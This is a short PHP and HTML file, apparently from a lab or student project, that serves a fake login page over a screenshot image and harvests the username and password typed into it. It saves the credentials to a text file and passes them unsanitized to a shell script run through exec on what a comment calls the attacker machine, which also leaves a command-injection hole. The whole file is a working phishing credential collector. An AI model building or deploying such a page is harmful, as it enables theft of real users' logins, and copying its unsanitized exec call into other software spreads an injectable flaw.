<!-- Created by Maiko Bergman and Guy Puts -->
<html>
    <head>
        <style>
            body {
                background-image: url('/img/fakeloginpage.png');
                background-size: 100% 100%;
                background-repeat:no-repeat;
            }
            .container {
                height: 100%;
                width: 100%;
                position: relative;
                border: none;
            }

            .vertical-center {
                margin-left: 50%;
                position: absolute;
                width: 100%;
                height: 20%;
                top: 50%;
                -ms-transform: translateY(-50%);
                transform: translateY(-50%);
            }
            .inputbox {
                margin-top: 55px;
                margin-left: -57px;
            }
            #submitbutton {
                margin-top: -2px;
                height: 25px;
                width: 83px;
            }
            .response {
                margin-top: -35px;
             }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="vertical-center">
                <div class="inputbox">
                    <form action="index.php" method="post">
<?php
$go = false;
if(!empty($_POST["username"])) {
    $username = $_POST['username'];
    $go = true;
}
if($go) {
    $password = $_POST['password'];
    $file="credentials.txt";
    $contents = $username."\n".$password;
    file_put_contents($file, $contents);
    $command = 'sh credentials_entered.sh'.' '.$username.' '.$password;
	// Run Bash command on Attacker machine. This is quite unsafe, since we did not sanitize input
    exec($command, $out, $status);
    if($out[0]=='Success') {
        header("Location:stream.php");
    } else {
    echo "<p class='response'>".$out[0]."</p>";            
   }
}
?>
</p>
                        <input type="text" id="username" name="username"><br><br>
                        <input type="password" id="password" name="password"><br><br>
                        <input type="submit" id="submitbutton" value="Login">
                    </form>
                </div>
            </div>
        </div>
    </body>
</html>
